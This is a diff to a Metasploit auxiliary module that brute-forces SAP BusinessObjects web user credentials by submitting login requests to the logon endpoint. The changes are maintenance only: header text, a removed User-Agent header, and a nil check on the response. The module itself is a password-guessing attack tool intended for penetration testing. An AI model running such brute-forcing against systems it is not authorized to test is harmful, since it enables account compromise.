@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -23,7 +19,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'		   => 'SAP BusinessObjects Web User Bruteforcer',
-			'Version'		=> '$Revision$',
 			'Description'	=> 'This module simply attempts to bruteforce SAP BusinessObjects users by using CmcApp.',
 			'References'  =>
 				[
@@ -44,11 +39,7 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		res = send_request_cgi({
 			'uri'	 => "/PlatformServices/service/app/logon.object",
-			'method'  => 'GET',
-				'headers' => {
-					'User-Agent' => datastore['UserAgent']
-				}
-
+			'method'  => 'GET'
 		}, 25)
 		return if not res
 
@@ -58,7 +49,6 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def enum_user(user, pass)
-		verbose = datastore['VERBOSE']
 		vprint_status("#{rhost}:#{rport} - Trying username:'#{user}' password: '#{pass}'")
 		success = false
 		data = 'isFromLogonPage=true&cms=127.0.1%3A6400'
@@ -76,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
 								'Accept-Encoding' => "gzip,deflate",
 							},
 			}, 45)
-			return :abort if (res.code != 200)
+			return :abort if (!res or (res and res.code != 200))
 			if(res.body.match(/Account Information/i))
 				success = false
 			else
